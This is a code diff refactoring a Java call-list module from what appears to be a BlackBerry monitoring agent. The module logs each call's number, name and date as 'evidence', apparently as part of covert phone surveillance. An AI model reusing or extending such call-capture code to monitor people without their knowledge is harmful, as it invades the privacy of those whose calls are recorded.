@@ -12,9 +12,11 @@ import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
-import blackberry.config.Conf;
+import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.interfaces.CallListObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
@@ -28,29 +30,8 @@ public final class ModuleCallList extends BaseModule implements CallListObserver
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
     //#endif
 
-    /**
-     * Instantiates a new call list agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public ModuleCallList(final boolean agentEnabled) {
-        super(BaseModule.AGENT_CALLLIST, agentEnabled, Conf.AGENT_CALLIST_ON_SD, "CallListAgent");
+   
 
-    }
-
-    /**
-     * Instantiates a new call list agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected ModuleCallList(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
-    }
 
     public void actualStart() {
         AppListener.getInstance().addCallListObserver(this);
@@ -71,9 +52,9 @@ public final class ModuleCallList extends BaseModule implements CallListObserver
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
      */
-    protected boolean parse(final byte[] confParameters) {
+    protected boolean parse(ConfModule conf) {
 
-        return false;
+        return true;
     }
 
     public void callLogAdded(String number, String name, Date date,
@@ -128,6 +109,7 @@ public final class ModuleCallList extends BaseModule implements CallListObserver
         Utils.addTypedString(databuffer, (byte) 0x04, note);
         Utils.addTypedString(databuffer, (byte) 0x08, number);
 
+        Evidence evidence = new Evidence(EvidenceType.CALLLIST);
         evidence.atomicWriteOnce(getAdditionalData(), databuffer.getArray());
 
     }
